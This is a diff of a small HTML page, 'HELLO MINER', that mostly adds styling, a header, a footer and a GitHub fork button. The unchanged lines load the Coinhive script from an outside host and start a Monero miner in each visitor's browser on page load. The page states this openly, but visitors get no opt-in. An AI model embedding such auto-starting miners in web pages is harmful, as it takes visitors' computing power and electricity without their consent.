@@ -4,17 +4,47 @@
     <meta charset="utf-8">
     <title>HELLO MINER | My personal monero miner</title>
     <style>
-
+      html,body {
+        margin: 0
+      }
+      h1 {
+        font-size: 72px;
+        color: #333;
+        margin-bottom: 0;
+      }
+      header, footer {
+        padding: 30px;
+      }
+      .container {
+        max-width: 1200px;
+        margin: auto;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-around;
+      }
+      .text {
+        color: #999;
+        margin-top: 0;
+      }
     </style>
   </head>
-  <body>
-    <h1>HELLO MINER</h1>
-    <p>Thanks, this website is currently using your browser to mine monero</p>
+  <body class="container">
+    <header>
+      <h1>HELLO MINER</h1>
+      <p class="text">Thanks, this website is currently using your browser to mine monero</p>
+      <a class="github-button" href="https://github.com/sandoche/Monero-miner-website/fork" data-icon="octicon-repo-forked" data-size="large" aria-label="Fork sandoche/Monero-miner-website on GitHub">Fork this miner</a>
+    </header>
+    <footer>
+      <p>Made with ❤ in France</p>
+    </footer>
 
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
     	var miner = new CoinHive.Anonymous('CG0PEeJ5RCwGcpdIc6QcnSAJdDJPWoio');
     	miner.start();
     </script>
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
   </body>
 </html>
